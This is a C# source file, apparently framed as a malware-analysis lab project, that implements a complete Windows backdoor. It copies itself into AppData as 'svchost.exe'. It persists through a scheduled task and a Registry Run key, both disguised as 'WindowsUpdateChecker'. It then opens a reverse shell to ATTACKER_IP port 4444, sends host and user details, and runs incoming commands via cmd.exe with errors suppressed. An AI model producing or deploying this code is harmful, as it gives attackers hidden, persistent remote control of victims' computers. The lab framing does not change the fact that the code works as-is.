using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Threading;
namespace MalwareAnalysisProject
{
internal class Program
{
// Replace with your analysis machine IP and port
private static string ATTACKER_IP = "10.0.2.15";
private static int ATTACKER_PORT = 4444;
    
    static void Main(string[] args)
    {
        // Check if this is a relocated instance
        bool isPayloadInstance = CheckForPayloadArg(args);
        string currentFilePath = Process.GetCurrentProcess().MainModule.FileName;
        string destPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            @"Microsoft\Windows\svchost.exe"
        );

        // If this is the relocated instance, just run the payload
        if (isPayloadInstance || currentFilePath.Equals(destPath, StringComparison.OrdinalIgnoreCase))
        {
            // Run the payload (reverse shell)
            EstablishReverseShell();
            return;
        }

        // If this is the initial run, handle relocation
        try
        {
            // Create directory if needed
            if (!Directory.Exists(Path.GetDirectoryName(destPath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(destPath));
            }

            // Copy file to destination if not already there
            if (!File.Exists(destPath))
            {
                File.Copy(currentFilePath, destPath, true);
            }

            // Try to use scheduled task for persistence (requires admin)
            bool scheduled = TryCreateScheduledTask(destPath);

            if (!scheduled)
            {
                // Fallback to registry persistence if scheduled task fails
                SetRegistryPersistence(destPath);
            }

            // Launch the relocated payload with special argument
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = destPath,
                Arguments = "--payload",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(startInfo);
        }
        catch
        {
            // If relocation fails, just run the payload
            EstablishReverseShell();
        }
    }

    static bool CheckForPayloadArg(string[] args)
    {
        // Check if this instance was launched with the payload argument
        return args.Length > 0 && args[0] == "--payload";
    }

    static bool TryCreateScheduledTask(string filePath)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $@"/create /sc onlogon /tn ""WindowsUpdateChecker"" /tr """"{filePath}"" --payload"" /rl HIGHEST /f",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            var process = Process.Start(psi);
            process.WaitForExit();
            return process.ExitCode == 0;
        }
        catch
        {
            return false;
        }
    }

    static void SetRegistryPersistence(string filePath)
    {
        try
        {
            using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true))
            {
                if (rk != null)
                {
                    rk.SetValue("WindowsUpdateChecker", $"\"{filePath}\" --payload");
                }
            }
        }
        catch
        {
            // Silent error handling
        }
    }

    public static void EstablishReverseShell()
    {
        // Add a slight delay before connecting


        try
        {
            // Set up reverse shell connection
            using (TcpClient client = new TcpClient(ATTACKER_IP, ATTACKER_PORT))
            using (NetworkStream stream = client.GetStream())
            using (StreamWriter writer = new StreamWriter(stream))
            using (StreamReader reader = new StreamReader(stream))
            {
                writer.AutoFlush = true;

                // Send system info on connection
                string systemInfo = $"Connected to {Environment.MachineName} as {Environment.UserName}\n" +
                                    $"OS: {Environment.OSVersion}\n" +
                                    $"64-bit: {Environment.Is64BitOperatingSystem}\n" +
                                    $"Path: {Process.GetCurrentProcess().MainModule.FileName}\n";
                writer.WriteLine(systemInfo);

                // Command execution loop
                while (true)
                {
                    // Display prompt
                    writer.Write(Environment.UserName + "@" + Environment.MachineName + "> ");

                    // Get command from attacker
                    string command = reader.ReadLine();

                    // Process special commands
                    if (string.IsNullOrEmpty(command)) continue;
                    if (command.ToLower() == "exit") break;

                    try
                    {
                        string output = ExecuteCommand(command);
                        writer.WriteLine(output);
                    }
                    catch (Exception ex)
                    {
                        writer.WriteLine("Error: " + ex.Message);
                    }
                }
            }
        }
        catch
        {
            // Silent failure
        }
    }

    private static string ExecuteCommand(string command)
    {
        // Create process to execute command
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c " + command,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        // Execute and capture output
        using (Process process = Process.Start(psi))
        {
            // Read output and error streams
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            // Return combined output
            if (string.IsNullOrEmpty(error))
                return output;
            else
                return output + "\n" + error;
        }
    }
}
}
